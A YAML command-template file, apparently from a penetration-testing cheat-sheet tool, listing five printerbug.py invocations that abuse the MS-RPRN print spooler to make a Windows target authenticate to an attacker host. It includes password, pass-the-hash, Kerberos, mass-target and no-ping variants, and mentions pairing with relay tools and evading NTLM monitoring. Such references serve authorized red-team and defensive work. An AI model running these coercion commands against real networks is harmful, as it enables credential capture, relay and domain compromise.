tool: printerbug
tags: [active-directory, pentest, coercion, spooler, impacket]

actions:
 - title: printerbug - coerce auth with password
   desc: |
     Triggers MS-RPRN coerce authentication from target to your host.
     Pair with ntlmrelayx or Responder listening on the attacker host.
   command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{target}} {{attacker_host}}"

 - title: printerbug - coerce with hashes
   desc: |
     Coerces authentication using NTLM hashes instead of a password.
     Standard when only hashes were dumped from a prior host.
   command: "printerbug.py {{domain}}/{{username}}@{{target}} {{attacker_host}} -hashes {{lm_hash|aad3b435b51404eeaad3b435b51404ee}}:{{nt_hash}}"

 - title: printerbug - coerce with kerberos
   desc: |
     Authenticates with Kerberos tickets from ccache instead of NTLM.
     Stealthier in environments where NTLM is monitored or restricted.
   command: "printerbug.py {{domain}}/{{username}}@{{target}} {{attacker_host}} -k -no-pass -dc-ip {{dc_ip}}"

 - title: printerbug - coerce list of targets
   desc: |
     Runs coercion against every host in a target file.
     Use to mass-trigger auth during relay or capture setups.
   command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{dummy}} {{attacker_host}} -target-file {{targets_file}}"

 - title: printerbug - no ping with timeout
   desc: |
     Skips the TCP ping check and sets a custom connection timeout.
     Needed when SMB ports are filtered but still reachable slowly.
   command: "printerbug.py {{domain}}/{{username}}:{{password}}@{{target}} {{attacker_host}} -no-ping -timeout {{seconds|5}}"
